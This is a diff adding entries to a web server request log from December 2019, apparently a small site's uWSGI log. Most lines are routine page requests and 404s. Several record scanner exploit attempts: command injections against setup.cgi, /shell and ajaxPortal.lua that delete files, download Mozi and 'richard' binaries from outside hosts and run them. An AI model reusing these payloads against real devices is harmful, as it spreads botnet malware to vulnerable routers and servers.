@@ -45,3 +45,39 @@ Not Found: /elrekt.php
 Not Found: /index.php
 [pid: 10545|app: 0|req: 9/9] 139.159.183.225 () {34 vars in 484 bytes} [Mon Dec 16 07:41:12 2019] GET /index.php => generated 1975 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
 [pid: 10545|app: 0|req: 10/10] 139.159.183.225 () {34 vars in 469 bytes} [Mon Dec 16 07:41:12 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 10545|app: 0|req: 11/11] 129.146.101.83 () {26 vars in 283 bytes} [Mon Dec 16 08:26:49 2019] GET / => generated 16351 bytes in 6 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 12/12] 159.65.27.252 () {30 vars in 377 bytes} [Mon Dec 16 08:43:11 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /robots.txt
+[pid: 10545|app: 0|req: 13/13] 74.63.227.26 () {26 vars in 302 bytes} [Mon Dec 16 08:59:28 2019] HEAD /robots.txt => generated 1979 bytes in 4 msecs (HTTP/1.0 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 14/14] 185.140.101.121 () {32 vars in 468 bytes} [Mon Dec 16 09:08:17 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /setup.cgi
+[pid: 10545|app: 0|req: 15/15] 175.3.181.163 () {26 vars in 597 bytes} [Mon Dec 16 09:56:57 2019] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.3.181.163:51834/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 2140 bytes in 17 msecs (HTTP/1.0 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 16/16] 84.193.201.197 () {28 vars in 310 bytes} [Mon Dec 16 10:41:07 2019] GET / => generated 16351 bytes in 8 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /editBlackAndWhiteList
+[pid: 10545|app: 0|req: 17/17] 172.118.249.158 () {46 vars in 668 bytes} [Mon Dec 16 11:23:33 2019] POST /editBlackAndWhiteList => generated 2012 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 18/18] 170.238.36.20 () {30 vars in 377 bytes} [Mon Dec 16 11:43:01 2019] GET / => generated 16351 bytes in 4 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /external.php
+[pid: 10545|app: 0|req: 19/19] 34.77.13.10 () {34 vars in 417 bytes} [Mon Dec 16 11:57:23 2019] GET /external.php => generated 1984 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /shell
+[pid: 10545|app: 0|req: 20/20] 1.246.222.39 () {34 vars in 644 bytes} [Mon Dec 16 12:19:03 2019] GET /shell?cd+/tmp;rm+-rf+*;wget+http://1.246.222.39:2995/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 2054 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 21/21] 13.89.46.128 () {30 vars in 437 bytes} [Mon Dec 16 12:50:40 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 22/22] 103.73.182.109 () {32 vars in 467 bytes} [Mon Dec 16 14:16:53 2019] GET / => generated 16351 bytes in 6 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /TP/public/index.php
+[pid: 10545|app: 0|req: 23/23] 103.249.192.35 () {34 vars in 503 bytes} [Mon Dec 16 17:33:00 2019] GET /TP/public/index.php => generated 2005 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /TP/index.php
+[pid: 10545|app: 0|req: 24/24] 103.249.192.35 () {34 vars in 489 bytes} [Mon Dec 16 17:33:00 2019] GET /TP/index.php => generated 1984 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 10545|app: 0|req: 25/25] 103.249.192.35 () {34 vars in 468 bytes} [Mon Dec 16 17:33:06 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 10545|app: 0|req: 26/26] 54.183.149.11 () {34 vars in 501 bytes} [Mon Dec 16 18:21:37 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 27/27] 90.180.67.190 () {32 vars in 465 bytes} [Mon Dec 16 18:43:55 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /TP/public/index.php
+[pid: 10545|app: 0|req: 28/28] 39.107.202.54 () {34 vars in 502 bytes} [Mon Dec 16 18:53:14 2019] GET /TP/public/index.php => generated 2005 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 29/29] 39.107.202.54 () {34 vars in 467 bytes} [Mon Dec 16 18:53:15 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 10545|app: 0|req: 30/30] 179.228.53.127 () {32 vars in 467 bytes} [Mon Dec 16 19:19:50 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /scripts/ajaxPortal.lua
+[pid: 10545|app: 0|req: 31/31] 208.113.204.109 () {44 vars in 1605 bytes} [Mon Dec 16 21:26:39 2019] POST /scripts/ajaxPortal.lua?destination=8.8.8.8$(wget http://145.249.106.241/richard; curl -O http://145.249.106.241/richard; chmod +x richard; sh richard)&source=192.168.0.1&test=BASIC_PING&requestTimeout=90&auth_token=&_cmd=run_diagnostic&destination=8.8.8.8$(wget http://145.249.106.241/richard; curl -O http://145.249.106.241/richard; chmod +x richard; sh richard)&test=DNS_TEST&requestTimeout=90&auth_token=&_cmd=run_diagnostic => generated 2496 bytes in 5 msecs (HTTP/1.0 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 32/32] 35.246.151.122 () {34 vars in 396 bytes} [Mon Dec 16 21:36:52 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 33/33] 159.65.188.111 () {30 vars in 378 bytes} [Mon Dec 16 22:19:50 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 34/34] 85.96.176.48 () {32 vars in 464 bytes} [Tue Dec 17 00:01:23 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 35/35] 209.17.97.66 () {30 vars in 399 bytes} [Tue Dec 17 00:02:16 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 36/36] 46.101.171.183 () {30 vars in 378 bytes} [Tue Dec 17 01:56:11 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 37/37] 79.167.2.47 () {32 vars in 463 bytes} [Tue Dec 17 02:38:17 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
